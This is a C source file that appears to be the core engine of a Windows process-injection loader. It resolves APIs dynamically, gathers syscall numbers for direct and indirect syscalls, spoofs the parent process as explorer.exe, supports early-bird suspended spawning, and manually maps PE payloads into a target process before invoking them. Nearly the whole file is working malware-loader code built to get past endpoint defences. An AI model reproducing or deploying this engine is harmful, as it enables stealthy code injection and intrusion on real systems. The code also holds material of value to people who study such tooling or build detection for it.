#include "engine.h"
#include "ps-utils.h"
#include "peb-eat-utils.h"
#include "syscall-utils.h"
#include "resolver.h"

#include <stdio.h>

static LOCAL_LOADER_CONTEXT g_EnvContext = { 0 };

/*// DFR function pointers (kernel32)
static P_VirtualAllocEx      g_VirtualAllocEx      = NULL;
static P_VirtualProtectEx    g_VirtualProtectEx    = NULL;
static P_WriteProcessMemory  g_WriteProcessMemory  = NULL;
static P_CreateRemoteThread  g_CreateRemoteThread  = NULL;
static P_WaitForSingleObject g_WaitForSingleObject = NULL;*/

P_VirtualAllocEx      g_VirtualAllocEx      = NULL;
P_VirtualProtect      g_VirtualProtect      = NULL;
P_VirtualProtectEx    g_VirtualProtectEx    = NULL;
P_WriteProcessMemory  g_WriteProcessMemory  = NULL;
P_CreateRemoteThread  g_CreateRemoteThread  = NULL;
P_WaitForSingleObject g_WaitForSingleObject = NULL;

// indirect syscall SSNs
DWORD    wNtAllocateVirtualMemorySSN      = 0;
DWORD    wNtProtectVirtualMemorySSN       = 0;
DWORD    wNtWriteVirtualMemorySSN         = 0;
DWORD    wNtCreateThreadExSSN             = 0;
DWORD    wNtWaitForSingleObjectSSN        = 0;
DWORD    wNtQueueApcThreadSSN             = 0;
DWORD    wNtResumeThreadSSN               = 0;

// function addresses
UINT_PTR sysAddrNtAllocateVirtualMemory   = 0;
UINT_PTR sysAddrNtProtectVirtualMemory    = 0;
UINT_PTR sysAddrNtWriteVirtualMemory      = 0;
UINT_PTR sysAddrNtCreateThreadEx          = 0;
UINT_PTR sysAddrNtWaitForSingleObject     = 0;
UINT_PTR sysAddrNtQueueApcThread          = 0;
UINT_PTR sysAddrNtResumeThread            = 0;

#ifdef _WIN64
#define RELOC_TYPE IMAGE_REL_BASED_DIR64
#else
#define RELOC_TYPE IMAGE_REL_BASED_HIGHLOW
#endif

static BOOL IsPayloadPE(LPCVOID pPayload) {
    if (!pPayload) return FALSE;

    const BYTE *pRaw = (const BYTE *)pPayload;
    const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER *)pRaw;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    const IMAGE_NT_HEADERS *pNt =
        (const IMAGE_NT_HEADERS *)(pRaw + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    return TRUE;
}

static BOOL WriteBufferFlavorAware(PINJECTION_CONTEXT ctx,
                                   PBYTE dest,
                                   PBYTE src,
                                   SIZE_T size)
{
    SIZE_T written = 0;

    // Local process → memcpy
    if (ctx->hProcess == (HANDLE)-1)
    {
        __try {
            memcpy(dest, src, size);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    // Remote process → flavor-aware
    switch (ctx->writeFlavor)
    {
        case FLAVOR_WIN32:
            return WriteProcessMemory(ctx->hProcess,
                                      dest,
                                      src,
                                      size,
                                      &written);

        case FLAVOR_DFR:
            if (!g_WriteProcessMemory)
                return FALSE;
            return g_WriteProcessMemory(ctx->hProcess,
                                        dest,
                                        src,
                                        size,
                                        &written);

        case FLAVOR_DIRECT: {
            NTSTATUS status = SysNtWriteVirtualMemory(ctx->hProcess,
                                                      dest,
                                                      src,
                                                      size,
                                                      &written);
            return (status == 0 && written == size);
        }

        case FLAVOR_INDIRECT: {
            NTSTATUS status = IndirectSysNtWriteVirtualMemory(ctx->hProcess,
                                                              dest,
                                                              src,
                                                              size,
                                                              &written);
            return (status == 0 && written == size);
        }

        default:
            return FALSE;
    }
}

//
// Flavor-aware ManualMapWrite (pure C)
//
BOOL ManualMapWrite(PINJECTION_CONTEXT ctx, LPCVOID pPayload)
{
    if (!ctx || !pPayload || ctx->pRemoteAddress == NULL)
        return FALSE;

    PBYTE pRaw  = (PBYTE)pPayload;
    PBYTE pDest = (PBYTE)ctx->pRemoteAddress;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pRaw;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS pNtHeaders =
        (PIMAGE_NT_HEADERS)(pRaw + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    //
    // 1. Write PE headers
    //
    if (!WriteBufferFlavorAware(ctx,
                                pDest,
                                pRaw,
                                pNtHeaders->OptionalHeader.SizeOfHeaders))
        return FALSE;

    //
    // 2. Write sections
    //
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (pSection[i].SizeOfRawData == 0)
            continue;

        PBYTE pSectionDest = pDest + pSection[i].VirtualAddress;
        PBYTE pSectionSrc  = pRaw  + pSection[i].PointerToRawData;

        if (!WriteBufferFlavorAware(ctx,
                                    pSectionDest,
                                    pSectionSrc,
                                    pSection[i].SizeOfRawData))
            return FALSE;
    }

    //
    // 3. Relocations (local only)
    //
    if (ctx->hProcess == (HANDLE)-1)
    {
        ULONG_PTR delta = (ULONG_PTR)pDest - pNtHeaders->OptionalHeader.ImageBase;

        if (delta != 0)
        {
            IMAGE_DATA_DIRECTORY relocDir =
                pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            if (relocDir.VirtualAddress != 0 &&
                relocDir.Size > 0)
            {
                PIMAGE_BASE_RELOCATION pRelocBlock =
                    (PIMAGE_BASE_RELOCATION)(pDest + relocDir.VirtualAddress);

                while (pRelocBlock->VirtualAddress != 0 &&
                       pRelocBlock->SizeOfBlock > 0)
                {
                    DWORD entryCount =
                        (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) /
                        sizeof(WORD);

                    PWORD pEntries =
                        (PWORD)((PBYTE)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));

                    for (DWORD i = 0; i < entryCount; i++)
                    {
                        WORD type   = pEntries[i] >> 12;
                        WORD offset = pEntries[i] & 0x0FFF;

                        if (type == RELOC_TYPE)
                        {
                            ULONG_PTR *pPatchTarget =
                                (ULONG_PTR *)(pDest +
                                              pRelocBlock->VirtualAddress +
                                              offset);
                            *pPatchTarget += delta;
                        }
                    }

                    pRelocBlock =
                        (PIMAGE_BASE_RELOCATION)((PBYTE)pRelocBlock +
                                                 pRelocBlock->SizeOfBlock);
                }
            }
        }
    }

    return TRUE;
}

BOOL InitializeResolvers(PINJECTION_CONTEXT ctx)
{
    BOOL needDFR      = FALSE;
    BOOL needIndirect = FALSE;

    //
    // Determine which resolver types are needed based on per-stage flavors
    //
    if (ctx->allocFlavor   == FLAVOR_DFR ||
        ctx->writeFlavor   == FLAVOR_DFR ||
        ctx->protectFlavor == FLAVOR_DFR ||
        ctx->invokeFlavor  == FLAVOR_DFR)
    {
        needDFR = TRUE;
    }

    if (ctx->allocFlavor   == FLAVOR_INDIRECT ||
        ctx->writeFlavor   == FLAVOR_INDIRECT ||
        ctx->protectFlavor == FLAVOR_INDIRECT ||
        ctx->invokeFlavor  == FLAVOR_INDIRECT)
    {
        needIndirect = TRUE;
    }

    //
    // Initialize DFR resolver (kernel32 exports)
    //
    if (needDFR)
    {
        printf("[*] Initializing DFR resolver...\n");

        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32)
        {
            printf("[ERROR] Failed to get kernel32.dll\n");
            return FALSE;
        }

        g_VirtualAllocEx =
            (P_VirtualAllocEx)GPAManualByName(hKernel32, "VirtualAllocEx");
        g_WriteProcessMemory =
            (P_WriteProcessMemory)GPAManualByName(hKernel32, "WriteProcessMemory");
        g_VirtualProtect =
            (P_VirtualProtect)GPAManualByName(hKernel32, "VirtualProtect");
        g_VirtualProtectEx =
            (P_VirtualProtectEx)GPAManualByName(hKernel32, "VirtualProtectEx");
        g_CreateRemoteThread =
            (P_CreateRemoteThread)GPAManualByName(hKernel32, "CreateRemoteThread");
        g_WaitForSingleObject =
            (P_WaitForSingleObject)GPAManualByName(hKernel32, "WaitForSingleObject");

        if (!g_VirtualAllocEx || !g_WriteProcessMemory ||
            !g_VirtualProtect || !g_VirtualProtectEx || 
            !g_CreateRemoteThread || !g_WaitForSingleObject)
        {
            printf("[ERROR] DFR resolver failed.\n");
            return FALSE;
        }

        printf("[+] DFR resolver initialized.\n");
    }

    //
    // Initialize Indirect resolver (SSNs + syscall addresses)
    //
    if (needIndirect)
    {
        printf("[*] Initializing Indirect resolver...\n");

#if defined(_WIN64)
        PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
        PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif

        g_EnvContext.wNtAllocateVirtualMemorySSN = GetSSNByName(pPeb, "NtAllocateVirtualMemory");
        g_EnvContext.wNtProtectVirtualMemorySSN  = GetSSNByName(pPeb, "NtProtectVirtualMemory");
        g_EnvContext.wNtWriteVirtualMemorySSN    = GetSSNByName(pPeb, "NtWriteVirtualMemory");

        printf("[+] Indirect SSNs loaded.\n");

        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (!hNtdll)
        {
            printf("[ERROR] Failed to resolve ntdll.dll\n");
            return FALSE;
        }

        g_EnvContext.sysAddrNtAllocateVirtualMemory =
            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtAllocateVirtualMemory"));
        g_EnvContext.sysAddrNtProtectVirtualMemory =
            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtProtectVirtualMemory"));
        g_EnvContext.sysAddrNtWriteVirtualMemory =
            (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWriteVirtualMemory"));

        // Bridge values into globals used by indirect-syscalls.asm
        wNtAllocateVirtualMemorySSN    = g_EnvContext.wNtAllocateVirtualMemorySSN;
        wNtProtectVirtualMemorySSN     = g_EnvContext.wNtProtectVirtualMemorySSN;
        wNtWriteVirtualMemorySSN       = g_EnvContext.wNtWriteVirtualMemorySSN;

        sysAddrNtAllocateVirtualMemory = g_EnvContext.sysAddrNtAllocateVirtualMemory;
        sysAddrNtProtectVirtualMemory  = g_EnvContext.sysAddrNtProtectVirtualMemory;
        sysAddrNtWriteVirtualMemory    = g_EnvContext.sysAddrNtWriteVirtualMemory;

        // Additional indirect syscalls
        wNtCreateThreadExSSN           = GetSSNByName(pPeb, "NtCreateThreadEx");
        wNtWaitForSingleObjectSSN      = GetSSNByName(pPeb, "NtWaitForSingleObject");
        wNtQueueApcThreadSSN           = GetSSNByName(pPeb, "NtQueueApcThread");
        wNtResumeThreadSSN             = GetSSNByName(pPeb, "NtResumeThread");

        sysAddrNtCreateThreadEx        = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtCreateThreadEx"));
        sysAddrNtWaitForSingleObject   = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtWaitForSingleObject"));
        sysAddrNtQueueApcThread        = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtQueueApcThread"));
        sysAddrNtResumeThread          = (UINT_PTR)GetSyscallAddress(GPAManualByName(hNtdll, "NtResumeThread"));

        printf("[+] Indirect resolver initialized.\n");
        printf("[+] SSNs Loaded: NtAllocateVirtualMemory(0x%X), NtWriteVirtualMemory(0x%X), NtProtectVirtualMemory(0x%X), NtCreateThreadEx(0x%X), NtWaitForSingleObject(0x%X)\n",
            wNtAllocateVirtualMemorySSN, wNtWriteVirtualMemorySSN, wNtProtectVirtualMemorySSN, wNtCreateThreadExSSN, wNtWaitForSingleObjectSSN);        
    }

    return TRUE;
}

BOOL InitializeTarget(PINJECTION_CONTEXT ctx, SYSCALL_FLAVOR flavor) {
    if (ctx->spawnPath) {
#ifndef REFLECTIVE_PAYLOAD
        STARTUPINFOEXA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        SIZE_T attributeSize = 0;

        DWORD parentPid = FindPidByName(L"explorer.exe");
        if (parentPid == 0) return FALSE;

        HANDLE hParent =
            OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
        if (!hParent) return FALSE;

        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        si.lpAttributeList =
            (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0,
                                                    attributeSize);
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0,
                                          &attributeSize);
        UpdateProcThreadAttribute(si.lpAttributeList, 0,
                                  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                  &hParent, sizeof(HANDLE), NULL, NULL);

        DWORD startupFlags = EXTENDED_STARTUPINFO_PRESENT;
        if (ctx->technique == EARLY_BIRD) {
            startupFlags |= CREATE_SUSPENDED;
        }

        if (!CreateProcessA(NULL,
                            ctx->spawnPath,
                            NULL,
                            NULL,
                            FALSE,
                            startupFlags,
                            NULL,
                            NULL,
                            &si.StartupInfo,
                            &pi)) {
            DeleteProcThreadAttributeList(si.lpAttributeList);
            HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
            CloseHandle(hParent);
            return FALSE;
        }

        ctx->hProcess = pi.hProcess;
        ctx->hThread  = pi.hThread;

        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);

        return TRUE;
#else
        return FALSE;
#endif
    }

    if (ctx->targetPid == 0) {
        printf("[*] No PID, using current process.\n");
        ctx->hProcess = (HANDLE)-1;
    } else {
#ifndef REFLECTIVE_PAYLOAD
        ctx->hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ctx->targetPid);
#endif
    }

    return ctx->hProcess != NULL;
}

char* flavorName(SYSCALL_FLAVOR f)
{
    switch (f) {
        case FLAVOR_WIN32:    return "WIN32";
        case FLAVOR_DFR:      return "DFR";
        case FLAVOR_DIRECT:   return "DIRECT";
        case FLAVOR_INDIRECT: return "INDIRECT";
        default:              return "UNKNOWN";
    }
}

BOOL EngineExecute(PINJECTION_ENGINE engine,
                   PINJECTION_CONTEXT ctx,
                   LPCVOID pPayload,
                   DWORD finalProtect)
{
    InitializeTarget(ctx, ctx->allocFlavor);
    InitializeResolvers(ctx);

    engine->Allocate(ctx, PAGE_READWRITE);

    if (IsPayloadPE(pPayload))
        ManualMapWrite(ctx, pPayload);
    else
        engine->Write(ctx, pPayload);

    DWORD oldProt = 0;
    engine->Protect(ctx, finalProtect, &oldProt);

    return engine->Invoke(ctx);
}
